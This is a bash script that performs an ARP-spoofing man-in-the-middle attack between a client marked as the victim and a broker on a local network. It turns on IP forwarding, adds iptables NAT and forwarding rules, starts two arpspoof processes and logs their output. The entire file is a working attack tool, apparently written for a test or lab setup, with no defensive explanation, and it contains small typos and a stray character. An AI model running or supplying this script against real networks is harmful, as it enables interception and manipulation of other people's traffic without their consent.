#!/bin/bash

INTERFACE="wlo1"
VICTIM_IP="192.168.86.244" #client
BROKER_IP="192.168.86.206"

LOG_FILE="arp_spoof.log"

echo "[*] Start ARP Spoofing..."
echo "{*] MITM between Client($VICTIM_IP) and Broker($BROKER_IP)" | tee -a $LOG_FILE

# Activate IP fowarding
echo 1 > /proc/sys/net/ipv4/ip_forward

iptables -t nat -A POSTROUTING -o $INTERFACE -j MASQUERADE
iptables -A FORWARD -i $INTERFACE -j ACCEPT

# Start ARP Spoofing
echo "[*] Sending ARP spoofing packets to CLIENT..." | tee -a $LOG_FILE
arpspoof -i $INTERFACE -t $VICTIM_IP $BROKER_IP >> $LOG_FILE 2>&1 &
ARP_PID1=$!

echo "[*] Sending ARP spoofing packets to BROKER,,," | tee -a $LOG_FILE
arpspoof -i $INTERFACE -t $BROKER_IP $VICTIM_IP >> $LOG_FILE 2>&1 &
ARP_PID2=$!ㅁ

trap "echo '[*] Stopping ARP spoofing...' | tee -a $LOG_FILE; kill $ARP_PID1 $ARP_PID2; echo 0 > /proc/sys/net/ipv4/ip_forward; exit" INT

while true; do
	sleep 1
done
